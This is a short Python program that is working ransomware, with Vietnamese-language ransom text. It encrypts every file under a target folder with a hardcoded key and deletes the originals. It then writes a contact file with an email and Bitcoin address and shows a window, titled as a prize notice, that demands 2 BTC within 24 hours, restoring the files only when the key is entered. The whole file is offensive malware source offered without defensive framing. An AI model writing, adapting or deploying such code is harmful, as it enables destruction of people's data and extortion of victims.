import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
key =  b'V5MnGQY7tYBe_j7szl0NI2SF36kFGYyi6Mzw5Kg-Oqk='

crypter = Fernet(key)

def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        plaintext = file.read()

    encrypted_text = crypter.encrypt(plaintext)

    with open(file_path + ".enc", 'wb') as file_encrypted:
        file_encrypted.write(encrypted_text)
    os.remove(file_path)
    print(f"File encrypted: {file_path}")

def decrypt_file(file_path):
    with open(file_path, 'rb') as file:
        cyphertext = file.read()
    _data = crypter.decrypt(cyphertext)
    with open(file_path.replace('.enc', ''), 'wb') as fp:
        fp.write(_data)
    os.remove(file_path)

directory = "C:/Test"

list_file = os.walk(directory)
for root, _, files in list_file:
    for file_name in files:
        if not file_name.endswith('.enc'):
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path)
    with open("D:/info.txt", "w") as f:
        f.write(f"email: lesyhoanganh2503@gmail.com")
        f.write(f"BTC address: 1LMcKyPmwebfygoeZP8E9jAMS2BcgH3Yip")

def check_input():
    user_input = entry.get()

    if user_input == str(key):
        list_file = os.walk(directory)
        for root, _, files in list_file:
            for file_name in files:
                if file_name.endswith('.enc'):
                    file_path = os.path.join(root, file_name)
                    decrypt_file(file_path)
        messagebox.showinfo("info", f"Đừng để bị hack nữa nhé!") 
    else:
        messagebox.showerror("Error", f"Key sai")

root = tk.Tk()
root.title("Thông báo giải thưởng")
root.geometry("800x400")

message = """Ổ đĩa {} của bạn đã bị vô hiệu hóa.
Vui lòng thanh toán 2 BTC để nhận được key giải mã.
Thông tin liên hệ ở D:/info.txt.
Liên hệ sau 24h tiếp theo kể từ {} để tránh mất dữ liệu.""".format(directory, datetime.now().strftime('%H:%M:%S'))
label = tk.Label(root, text=message, font=("Arial", 14))
label.pack(pady=10)

font_size = 14

username_label = tk.Label(root, text="Username", font=("Arial", font_size))
username_label.pack()
entry = tk.Entry(root, width=30, font=("Arial", font_size))
entry.pack(pady=5)

phone_label = tk.Label(root, text="Số điện thoại", font=("Arial", font_size))
phone_label.pack()
phone_entry = tk.Entry(root, width=30, font=("Arial", font_size))
phone_entry.pack(pady=5)

confirm_button = tk.Button(root, text="Xác nhận", command=check_input, font=("Arial", font_size))
confirm_button.pack(pady=10)

root.mainloop()